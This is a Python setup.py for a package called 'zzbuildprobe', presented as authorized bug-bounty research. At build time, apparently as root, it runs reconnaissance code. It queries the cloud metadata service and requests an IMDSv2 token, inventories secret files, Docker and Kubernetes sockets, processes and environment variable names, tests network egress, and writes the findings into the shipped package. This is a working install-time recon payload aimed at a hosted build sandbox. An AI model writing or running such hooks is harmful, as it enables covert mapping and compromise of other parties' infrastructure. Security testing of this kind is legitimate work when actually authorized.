# zzbuildprobe — build-host capability probe.
#
# Authorized security research against Databricks Model Serving (HackerOne
# #4076059). Runs at wheel-build time, as root, inside the image-build sandbox.
#
# READ-ONLY BY DESIGN. It records what the sandbox can REACH and what files
# EXIST (name, mode, size). It never reads, stores or transmits the contents of
# any credential:
#   - /latest/meta-data/iam/security-credentials/<role> is deliberately not fetched
#   - the IMDSv2 token is not retained (status + length only)
#   - secret files are inventoried by name/mode/size, never opened
#
# Everything is wrapped in try/except: a failing probe must not fail the build,
# because a failed build means no image and therefore no evidence.
import os
import re
import socket
import subprocess
import urllib.error
import urllib.request

OUT = os.path.join(os.path.dirname(os.path.abspath(__file__)),
                   'zzbuildprobe', 'build_evidence.py')


def sh(cmd, t=12):
    try:
        p = subprocess.run(cmd, shell=True, capture_output=True, text=True, timeout=t)
        return (p.stdout or p.stderr or '').strip()[:500]
    except Exception as e:
        return 'ERR:' + type(e).__name__


def http(url, method='GET', headers=None, timeout=5):
    req = urllib.request.Request(url, method=method)
    for k, v in (headers or {}).items():
        req.add_header(k, v)
    try:
        with urllib.request.urlopen(req, timeout=timeout) as r:
            return {'status': r.status, 'body': r.read(400).decode('utf-8', 'replace')}
    except urllib.error.HTTPError as e:
        try:
            return {'status': e.code, 'body': e.read(200).decode('utf-8', 'replace')}
        except Exception:
            return {'status': e.code}
    except Exception as e:
        return {'error': type(e).__name__}


def inv(paths):
    """Inventory only — name, mode, size. Contents are never opened."""
    out = {}
    for p in paths:
        if not p:
            continue
        try:
            st = os.lstat(p)
            e = {'mode': oct(st.st_mode & 0o7777), 'size': st.st_size}
            if os.path.isdir(p):
                e['entries'] = sorted(os.listdir(p))[:25]
            out[p] = e
        except FileNotFoundError:
            out[p] = 'absent'
        except Exception as e:
            out[p] = 'ERR:' + type(e).__name__
    return out


def redact(s):
    return re.sub(r'//[^/@\s]+:[^/@\s]+@', '//<redacted>@', s or '')


EV = {}
try:
    EV['host'] = socket.gethostname()
    EV['id'] = sh('id').strip()
    EV['uname'] = sh('uname -a').strip()[:200]
    EV['cwd'] = os.getcwd()
    EV['home'] = os.path.expanduser('~')

    # --- cloud instance metadata: REACHABILITY ONLY --------------------------
    imds = {}
    r = http('http://169.254.169.254/latest/meta-data/')
    if 'body' in r:
        cats = [c for c in r['body'].splitlines() if c.strip()]
        r = {'status': r['status'], 'categories': cats[:40],
             'has_iam': any(c.strip('/') == 'iam' for c in cats)}
    imds['aws_metadata_root'] = r

    t = http('http://169.254.169.254/latest/api/token', method='PUT',
             headers={'X-aws-ec2-metadata-token-ttl-seconds': '60'})
    imds['aws_imdsv2'] = {'status': t.get('status'),
                          'token_returned': bool(t.get('body'))}
    # /latest/meta-data/iam/security-credentials/ is NOT requested.
    EV['imds'] = imds

    # --- capability set / containment ---------------------------------------
    try:
        want = ('CapEff', 'CapPrm', 'CapBnd', 'Seccomp', 'NoNewPrivs')
        caps = {}
        for line in open('/proc/self/status'):
            k = line.split(':', 1)[0]
            if k in want:
                caps[k] = line.split(':', 1)[1].strip()
        EV['proc_status'] = caps
    except Exception as e:
        EV['proc_status'] = 'ERR:' + type(e).__name__

    EV['container'] = {
        'dockerenv': os.path.exists('/.dockerenv'),
        'cgroup': sh('head -c 160 /proc/1/cgroup'),
        'mount_fs_types': sorted(set(sh("awk '{print $3}' /proc/mounts").split()))[:25],
    }

    # --- secret / socket inventory (names + modes, never contents) -----------
    EV['fs_inventory'] = inv([
        '/run/secrets',
        '/var/run/docker.sock',
        '/run/docker.sock',
        '/root/.docker/config.json',
        '/root/.aws',
        '/var/run/secrets/kubernetes.io/serviceaccount',
        '/package-repo',
        '/model',
        os.environ.get('PIP_CONFIG_FILE', '/etc/pip.conf'),
    ])

    EV['pip_config'] = [redact(l) for l in sh('pip config list').splitlines()][:15]

    # --- is /tmp shared with anything else? ---------------------------------
    tmp = {}
    try:
        names = os.listdir('/tmp')
        tmp['count'] = len(names)
        tmp['pip_metadata_dirs'] = len([n for n in names if n.startswith('pip-metadata-')])
        tmp['pip_req_build_dirs'] = len([n for n in names if n.startswith('pip-req-build-')])
        sample = {}
        for n in names[:12]:
            try:
                st = os.lstat(os.path.join('/tmp', n))
                sample[n] = {'uid': st.st_uid, 'gid': st.st_gid,
                             'mode': oct(st.st_mode & 0o7777), 'mtime': int(st.st_mtime)}
            except Exception:
                pass
        tmp['sample'] = sample
        tmp['our_uid'] = getattr(os, 'getuid', lambda: -1)()
    except Exception as e:
        tmp['err'] = type(e).__name__
    EV['tmp'] = tmp

    # --- who else is on this box --------------------------------------------
    EV['procs'] = sh('ps -eo pid,user,comm --no-headers')[:400]

    # --- egress --------------------------------------------------------------
    net = {}
    for h, p in (('github.com', 443), ('pypi.org', 443), ('169.254.169.254', 80)):
        try:
            s = socket.create_connection((h, p), timeout=4)
            s.close()
            net['%s:%d' % (h, p)] = 'open'
        except Exception as e:
            net['%s:%d' % (h, p)] = type(e).__name__
    EV['net'] = net

    EV['envkeys'] = sorted(os.environ.keys())
    EV['ls__tmp'] = sorted(os.listdir('/tmp'))[:40]
except Exception:
    pass

open(OUT, 'w').write('EVIDENCE = ' + repr(EV) + '\n')

from setuptools import setup
setup(name='zzbuildprobe', version='1.3.0', packages=['zzbuildprobe'])
